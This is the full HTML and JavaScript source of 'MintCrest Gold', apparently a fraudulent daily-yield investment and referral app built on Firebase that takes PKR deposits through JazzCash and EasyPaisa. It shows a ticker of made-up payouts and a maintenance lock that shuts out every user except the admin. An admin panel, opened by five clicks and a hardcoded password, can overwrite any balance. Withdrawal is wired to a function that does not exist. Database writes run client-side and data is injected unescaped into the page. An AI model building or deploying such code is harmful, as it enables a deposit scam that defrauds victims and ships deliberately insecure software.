<!DOCTYPE html>
<html lang="en" id="main-html" class="dark">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <title>MintCrest Gold | Global Enterprise</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;700;800&display=swap');
        :root { --bg: #010409; --card: #0d1117; --text: #f0f6fc; --border: #30363d; --blue: #2f81f7; }
        body { font-family: 'Plus Jakarta Sans', sans-serif; background: var(--bg); color: var(--text); overflow-x: hidden; }
        .glass { background: var(--card); border: 1px solid var(--border); border-radius: 12px; }
        .page { display: none; animation: fadeIn 0.3s ease-in-out; }
        .active-page { display: block; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
        input { background: #161b22; border: 1px solid var(--border); color: white; padding: 12px; border-radius: 10px; width: 100%; outline: none; margin-bottom: 8px; font-size: 13px; transition: 0.2s; }
        input:focus { border-color: var(--blue); }
        .btn-prime { background: linear-gradient(135deg, #2f81f7, #1e40af); color: white; font-weight: 700; border-radius: 10px; cursor: pointer; border: none; padding: 14px; width: 100%; font-size: 11px; text-transform: uppercase; letter-spacing: 1px; }
        .ticker-wrap { background: #010409; border-bottom: 1px solid var(--border); padding: 8px 0; overflow: hidden; position: sticky; top: 0; z-index: 6000; }
        .ticker { display: inline-block; white-space: nowrap; animation: marquee 40s linear infinite; font-size: 10px; font-weight: 800; color: #2f81f7; text-transform: uppercase; }
        @keyframes marquee { 0% { transform: translateX(100%); } 100% { transform: translateX(-100%); } }
        #toast { visibility: hidden; min-width: 220px; background: #2f81f7; color: #fff; text-align: center; border-radius: 6px; padding: 14px; position: fixed; z-index: 20000; left: 50%; transform: translateX(-50%); bottom: 90px; font-size: 11px; font-weight: 800; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
        #toast.show { visibility: visible; animation: slideUp 0.4s, slideDown 0.4s 2.6s; }
        @keyframes slideUp { from {bottom: 0; opacity: 0;} to {bottom: 90px; opacity: 1;} }
        @keyframes slideDown { from {bottom: 90px; opacity: 1;} to {bottom: 0; opacity: 0;} }
        .wa-float { position: fixed; bottom: 100px; right: 20px; background: #25d366; color: white; width: 50px; height: 50px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 24px; box-shadow: 0 4px 15px rgba(0,0,0,0.4); z-index: 4500; }
    </style>
</head>
<body onclick="secretMaintenanceBypass()">

    <div id="toast">SYSTEM INITIALIZED</div>

    <div class="ticker-wrap">
        <div class="ticker">
            &bull; Payout Status: PKR 8,500 processed for @User782 &bull; New Node Activation: @EliteMiner &bull; High Yield Alert: Diamond Plan deployed &bull; Referral Commission: PKR 1,200 credited &bull; Server Status: Optimal &bull; Security Protocol: Active
        </div>
    </div>

    <div id="lock-screen" class="fixed inset-0 z-[1000000] bg-[#010409] hidden flex flex-col items-center justify-center p-10 text-center">
        <div class="w-14 h-14 border-2 border-blue-500 border-t-transparent rounded-full animate-spin mb-6"></div>
        <h1 class="text-xl font-bold text-blue-500 mb-2 uppercase tracking-[4px]">Maintenance Mode</h1>
        <p class="text-[9px] font-medium opacity-50 uppercase tracking-[2px] leading-relaxed">Financial infrastructure is undergoing a scheduled upgrade for improved performance.</p>
    </div>

    <header class="p-4 flex justify-between items-center bg-[#010409]/90 backdrop-blur-md border-b border-white/5 sticky top-[36px] z-[5000]">
        <div class="flex items-center gap-3">
            <div onclick="openAdmin()" class="w-10 h-10 bg-blue-600 rounded-lg flex items-center justify-center text-white font-extrabold text-lg shadow-lg shadow-blue-500/20 cursor-pointer">M</div>
            <div>
                <h1 class="text-[12px] font-black uppercase tracking-tight">MINTCREST <span class="text-blue-500">GOLD</span></h1>
                <p id="user-display-id" class="text-[7px] font-bold opacity-40 uppercase tracking-widest text-blue-400">Verifying Node...</p>
            </div>
        </div>
        <div id="top-bal-display" class="bg-blue-600/10 px-4 py-2 rounded-lg border border-blue-500/20 text-blue-500 text-[11px] font-black italic tracking-tighter">PKR 0.00</div>
    </header>

    <main id="app-main" class="hidden p-5 space-y-6 pb-32">
        
        <div id="p-home" class="page active-page space-y-6">
            <div class="glass p-8 bg-gradient-to-br from-blue-900 via-[#0d1117] to-[#010409] border-blue-500/10 relative overflow-hidden">
                <div class="absolute -right-10 -top-10 w-32 h-32 bg-blue-500/10 rounded-full blur-3xl"></div>
                <p class="text-[9px] font-bold opacity-50 uppercase tracking-widest">Available Liquidity</p>
                <h2 class="text-5xl font-black tracking-tighter mt-1 italic" id="main-bal">PKR 0</h2>
                <div class="mt-8 flex gap-3">
                    <button onclick="changePage('deposit')" class="flex-1 py-4 bg-blue-500 text-white rounded-xl font-black text-[10px] uppercase shadow-lg shadow-blue-500/20">Add Capital</button>
                    <button onclick="changePage('withdraw')" class="flex-1 py-4 bg-white/5 border border-white/10 rounded-xl font-black text-[10px] uppercase">Cash Out</button>
                </div>
            </div>
            
            <div id="nodes-grid" class="space-y-4"></div>
        </div>

        <div id="p-team" class="page space-y-6">
            <div class="glass p-6 text-center border-l-4 border-blue-500">
                <p class="text-[9px] font-bold opacity-40 uppercase mb-2">Unique Referral Identifier</p>
                <div class="flex items-center gap-2 bg-white/5 p-4 rounded-xl">
                    <p id="ref-url" class="text-[10px] font-bold text-blue-500 break-all flex-1 text-left">Generating...</p>
                    <button onclick="copyLink()" class="text-blue-500 text-lg"><i class="fa-solid fa-copy"></i></button>
                </div>
            </div>
            <div class="grid grid-cols-2 gap-4">
                <div class="glass p-5 text-center"><h4 id="team-count" class="text-2xl font-black">0</h4><p class="text-[8px] opacity-40 uppercase font-bold">Direct Network</p></div>
                <div class="glass p-5 text-center"><h4 id="team-comm" class="text-2xl font-black text-green-500">PKR 0</h4><p class="text-[8px] opacity-40 uppercase font-bold">Network Revenue</p></div>
            </div>
        </div>

        <div id="p-deposit" class="page space-y-6">
            <div id="gateways-container" class="space-y-2"></div>
            <div class="glass p-6 space-y-4">
                <input type="number" id="dep-amt" placeholder="Enter Deposit Amount (PKR)">
                <input type="text" id="dep-tid" placeholder="Transaction ID (TID)">
                <div class="text-[8px] opacity-40 uppercase mb-1">Upload Receipt Screenshot</div>
                <input type="file" id="dep-proof" class="text-[10px] border-dashed border-2 border-white/10 py-6">
                <button onclick="processDeposit()" class="btn-prime">Verify Asset Transfer</button>
            </div>
        </div>

        <div id="p-withdraw" class="page space-y-6">
            <div class="glass p-6 space-y-4">
                <input type="number" id="wit-amt" placeholder="Minimum Payout: PKR 500">
                <input type="text" id="wit-account" placeholder="Bank/Wallet Account Number">
                <input type="text" id="wit-title" placeholder="Full Account Title">
                <button onclick="processWithdrawal()" class="w-full py-4 bg-red-600/10 text-red-500 border border-red-500/30 rounded-xl font-black text-[10px] uppercase">Submit Payout Request</button>
            </div>
        </div>

        <div id="p-logs" class="page space-y-3"><div id="transaction-list" class="space-y-2"></div></div>
    </main>

    <div id="admin-panel" class="fixed inset-0 bg-[#010409] z-[100000] hidden overflow-y-auto p-6 pb-40">
        <div class="flex justify-between items-center mb-10 border-b border-white/5 pb-5">
            <h2 class="text-lg font-black text-blue-500 italic uppercase">Enterprise Terminal</h2>
            <button onclick="closeAdmin()" class="bg-white/5 px-6 py-2 rounded-lg text-[9px] font-bold uppercase">Exit Console</button>
        </div>

        <div class="space-y-4 mb-10">
            <button onclick="toggleSystemLock()" id="m-toggle-btn" class="w-full py-4 border border-blue-500/20 rounded-xl font-black text-[10px] uppercase tracking-widest transition">Maintenance: --</button>
            <div class="grid grid-cols-2 gap-4">
                <div class="glass p-5 text-center"><h4 id="adm-total-users" class="text-2xl font-black">0</h4><p class="text-[8px] opacity-40 uppercase">Total Nodes</p></div>
                <div class="glass p-5 text-center"><h4 id="adm-pending-reqs" class="text-2xl font-black text-blue-500">0</h4><p class="text-[8px] opacity-40 uppercase">Awaiting Action</p></div>
            </div>
        </div>

        <div class="glass p-6 mb-8 border-l-4 border-blue-500">
            <h4 class="text-[10px] font-black uppercase text-blue-500 mb-4">Plan Infrastructure</h4>
            <input id="adm-plan-name" placeholder="Plan Label">
            <input id="adm-plan-price" type="number" placeholder="Cost (PKR)">
            <input id="adm-plan-daily" type="number" placeholder="Yield/Day (PKR)">
            <button onclick="deployNewPlan()" class="w-full py-3 bg-blue-600 rounded-xl font-black text-[10px] uppercase">Deploy Node</button>
        </div>

        <div class="glass p-6 mb-8">
            <h4 class="text-[10px] font-black uppercase text-blue-500 mb-4">Payment Configuration</h4>
            <input id="adm-jazz-num" placeholder="JazzCash Number">
            <input id="adm-easy-num" placeholder="EasyPaisa Number">
            <button onclick="savePaymentConfig()" class="w-full py-3 bg-blue-600 rounded-xl font-black text-[10px] uppercase">Sync Numbers</button>
        </div>

        <div id="admin-queue" class="space-y-4"></div>

        <div class="glass p-6 mt-10 border-l-4 border-purple-500">
            <h4 class="text-[10px] font-black uppercase text-purple-500 mb-4">Account Integrity Override</h4>
            <input id="adm-target-user" placeholder="Account Name">
            <input id="adm-target-bal" type="number" placeholder="Forced Balance">
            <button onclick="forceUserUpdate()" class="w-full py-3 bg-purple-600 rounded-xl font-black text-[10px] uppercase">Override Database</button>
        </div>
    </div>

    <a href="https://wa.me/923705519562" class="wa-float" target="_blank"><i class="fa-brands fa-whatsapp"></i></a>

    <nav id="nav-bar" class="hidden fixed bottom-0 w-full glass bg-[#0d1117]/95 border-t border-white/5 p-6 flex justify-around items-center z-[5000] rounded-t-[32px]">
        <button onclick="changePage('home')" class="opacity-40"><i class="fa-solid fa-layer-group text-xl"></i></button>
        <button onclick="changePage('team')" class="opacity-40"><i class="fa-solid fa-users-viewfinder text-xl"></i></button>
        <button onclick="changePage('deposit')" class="opacity-40"><i class="fa-solid fa-plus-circle text-xl"></i></button>
        <button onclick="changePage('logs')" class="opacity-40"><i class="fa-solid fa-receipt text-xl"></i></button>
    </nav>

    <script>
        // CONFIGURATION
        const firebaseConfig = { apiKey: "AIzaSyDt3ChZHyDdtM4Ir1oXRZJUywcOiV30Wtg", authDomain: "investment-84f4e.firebaseapp.com", projectId: "investment-84f4e", storageBucket: "investment-84f4e.firebasestorage.app", messagingSenderId: "975293889308", appId: "1:975293889308:web:6d034a99cc966c75ff58d9" };
        firebase.initializeApp(firebaseConfig);
        const db = firebase.firestore();
        let userProfile = null; let admClicks = 0; let mBypassClicks = 0; let mStatus = false;

        // --- ADMIN GOD MODE ENGINE ---
        function openAdmin() { admClicks++; if(admClicks >= 5) { const k = prompt("Terminal Access Key:"); if(k==="mint786") { document.getElementById('admin-panel').classList.remove('hidden'); runAdminSync(); } admClicks=0; } }
        function closeAdmin() { document.getElementById('admin-panel').classList.add('hidden'); }
        function secretMaintenanceBypass() {
            if(!document.getElementById('lock-screen').classList.contains('hidden')) {
                mBypassClicks++; if(mBypassClicks >= 5) { const k = prompt("Override System Key:"); if(k==="mint786") { document.getElementById('lock-screen').classList.add('hidden'); document.getElementById('admin-panel').classList.remove('hidden'); runAdminSync(); } mBypassClicks=0; }
            }
        }

        async function runAdminSync() {
            db.collection("users").onSnapshot(s => document.getElementById('adm-total-users').innerText = s.size);
            db.collection("requests").where("status","==","pending").onSnapshot(s => {
                document.getElementById('adm-pending-reqs').innerText = s.size;
                const q = document.getElementById('admin-queue'); q.innerHTML = '';
                s.forEach(doc => {
                    const r = doc.data();
                    q.innerHTML += `<div class="glass p-5 border-l-4 border-blue-500 text-[10px] font-bold uppercase">
                        <div class="flex justify-between mb-3 text-blue-400"><span>${r.type} Request</span><span>${new Date(r.time).toLocaleTimeString()}</span></div>
                        <p class="mb-2">User: ${r.user} | Amount: PKR ${r.amount}</p>
                        ${r.proof ? `<img src="${r.proof}" class="w-full rounded-xl mb-4 border border-white/5">` : ''}
                        <div class="flex gap-2">
                            <button onclick="authRequest('${doc.id}','${r.user}',${r.amount},'${r.type}')" class="flex-1 py-3 bg-green-600 rounded-lg">Approve</button>
                            <button onclick="db.collection('requests').doc('${doc.id}').update({status:'rejected'})" class="flex-1 py-3 bg-red-600 rounded-lg">Reject</button>
                        </div>
                    </div>`;
                });
            });
            db.collection("settings").doc("system").onSnapshot(d => {
                mStatus = d.data()?.maintenance;
                const b = document.getElementById('m-toggle-btn');
                b.innerText = "MAINTENANCE: " + (mStatus ? "ACTIVE" : "OFF");
                b.className = mStatus ? "w-full py-4 bg-red-600/10 text-red-500 border border-red-500/20 rounded-xl font-black text-[10px] uppercase tracking-widest" : "w-full py-4 bg-green-600/10 text-green-500 border border-green-500/20 rounded-xl font-black text-[10px] uppercase tracking-widest";
            });
        }

        async function authRequest(id, u, a, type) {
            if(type === 'Deposit') {
                await db.collection("users").doc(u).update({ balance: firebase.firestore.FieldValue.increment(a) });
                const snap = await db.collection("users").doc(u).get();
                if(snap.data().refBy && snap.data().refBy !== 'Direct') {
                    await db.collection("users").doc(snap.data().refBy).update({ balance: firebase.firestore.FieldValue.increment(a * 0.10) });
                }
            }
            await db.collection("requests").doc(id).update({ status: 'approved' });
            triggerToast("AUTHORIZED");
        }

        async function deployNewPlan() {
            const n = document.getElementById('adm-plan-name').value;
            const p = Number(document.getElementById('adm-plan-price').value);
            const d = Number(document.getElementById('adm-plan-daily').value);
            if(n && p && d) { await db.collection("plans").add({ name: n, price: p, dailyProfit: d }); triggerToast("NODE DEPLOYED"); }
        }

        async function savePaymentConfig() {
            await db.collection("settings").doc("gateways").set({ jazz: document.getElementById('adm-jazz-num').value, easy: document.getElementById('adm-easy-num').value });
            triggerToast("GATEWAYS SYNCED");
        }

        async function toggleSystemLock() { await db.collection("settings").doc("system").set({ maintenance: !mStatus }); }

        async function forceUserUpdate() {
            const u = document.getElementById('adm-target-user').value.toLowerCase();
            const b = Number(document.getElementById('adm-target-bal').value);
            await db.collection("users").doc(u).update({ balance: b });
            triggerToast("OVERRIDE SUCCESSFUL");
        }

        // --- USER CORE LOGIC ---
        function runUserSync(id) {
            db.collection("users").doc(id).onSnapshot(d => {
                userProfile = d.data();
                const b = (userProfile.balance || 0).toLocaleString(undefined, {minimumFractionDigits: 2});
                document.getElementById('main-bal').innerText = "PKR " + b;
                document.getElementById('top-bal-display').innerText = "PKR " + b;
                document.getElementById('ref-url').innerText = window.location.origin + "/?ref=" + id;
                // Team Analytics
                db.collection("users").where("refBy","==",id).onSnapshot(s => {
                    document.getElementById('team-count').innerText = s.size;
                    let revenue = 0; s.forEach(doc => revenue += (doc.data().balance * 0.1));
                    document.getElementById('team-comm').innerText = "PKR " + revenue.toLocaleString();
                });
            });
            db.collection("settings").doc("system").onSnapshot(d => {
                if(d.data()?.maintenance && id !== 'admin') document.getElementById('lock-screen').classList.remove('hidden');
                else document.getElementById('lock-screen').classList.add('hidden');
            });
            db.collection("settings").doc("gateways").onSnapshot(d => {
                const g = d.data();
                document.getElementById('gateways-container').innerHTML = `
                    <div class="p-5 glass flex justify-between items-center text-[11px] font-bold border-l-4 border-yellow-500"><span>JazzCash Node</span><span>${g.jazz}</span></div>
                    <div class="p-5 glass flex justify-between items-center text-[11px] font-bold border-l-4 border-green-500"><span>EasyPaisa Node</span><span>${g.easy}</span></div>`;
            });
            db.collection("plans").orderBy("price","asc").onSnapshot(s => {
                const grid = document.getElementById('nodes-grid'); grid.innerHTML = '';
                s.forEach(doc => {
                    const p = doc.data();
                    grid.innerHTML += `<div class="glass p-6 border-l-4 border-blue-500 flex justify-between items-center">
                        <div><p class="text-[8px] font-bold opacity-30 uppercase tracking-widest">${p.name}</p><h4 class="text-xl font-black">PKR ${p.price.toLocaleString()}</h4><p class="text-[9px] text-green-500 font-bold mt-1">Daily: PKR ${p.dailyProfit}/Day</p></div>
                        <button onclick="triggerToast('CONTACT SUPPORT FOR PURCHASE')" class="bg-blue-600 px-6 py-3 rounded-xl font-black text-[9px] shadow-lg shadow-blue-500/20">ACQUIRE</button>
                    </div>`;
                });
            });
        }

        async function processDeposit() {
            const a = Number(document.getElementById('dep-amt').value); const t = document.getElementById('dep-tid').value; const f = document.getElementById('dep-proof').files[0];
            if(!a || !t || !f) return alert("Validation error: All proof required.");
            const reader = new FileReader(); reader.readAsDataURL(f);
            reader.onload = async () => {
                await db.collection("requests").add({ user: userProfile.name, amount: a, tid: t, proof: reader.result, type: 'Deposit', status: 'pending', time: Date.now() });
                triggerToast("REQUEST SENT"); changePage('home');
            };
        }

        // UTILITIES
        function triggerToast(m) { const t = document.getElementById("toast"); t.innerText = m; t.className = "show"; setTimeout(()=>t.className="", 3000); }
        function changePage(p) { document.querySelectorAll('.page').forEach(pg=>pg.classList.remove('active-page')); document.getElementById('p-'+p).classList.add('active-page'); }
        function copyLink() { navigator.clipboard.writeText(document.getElementById('ref-url').innerText); triggerToast("COPIED TO CLIPBOARD"); }
        
        window.onload = () => { 
            const session = localStorage.getItem('mc_session');
            if(session) {
                document.getElementById('user-display-id').innerText = "NODE ID: " + session.toUpperCase();
                document.getElementById('app-main').classList.remove('hidden');
                document.getElementById('nav-bar').classList.remove('hidden');
                runUserSync(session);
            } else {
                // Auto-redirect or show login logic here
            }
        }
    </script>
</body>
</html>
